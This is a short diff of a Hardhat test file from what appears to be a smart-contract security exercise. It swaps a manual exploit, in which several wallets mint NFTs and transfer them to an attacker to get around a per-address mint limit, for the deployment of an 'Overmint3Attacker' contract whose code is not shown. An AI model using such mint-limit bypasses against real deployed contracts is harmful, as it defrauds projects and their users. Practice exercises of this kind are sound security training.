@@ -22,17 +22,8 @@ describe(NAME, function () {
         });
 
         it("conduct your attack here", async function () {
-            await victimContract.connect(attackerWallet).mint();
-
-            await victimContract.connect(w1).mint();
-            await victimContract.connect(w2).mint();
-            await victimContract.connect(w3).mint();
-            await victimContract.connect(w4).mint();
-
-            await victimContract.connect(w1).transferFrom(w1.address, attackerWallet.address, 2);
-            await victimContract.connect(w2).transferFrom(w2.address, attackerWallet.address, 3);
-            await victimContract.connect(w3).transferFrom(w3.address, attackerWallet.address, 4);
-            await victimContract.connect(w4).transferFrom(w4.address, attackerWallet.address, 5);
+            const AttackerFactory = await ethers.getContractFactory("Overmint3Attacker");
+            await AttackerFactory.connect(attackerWallet).deploy(victimContract.address); 
         });
 
         after(async function () {
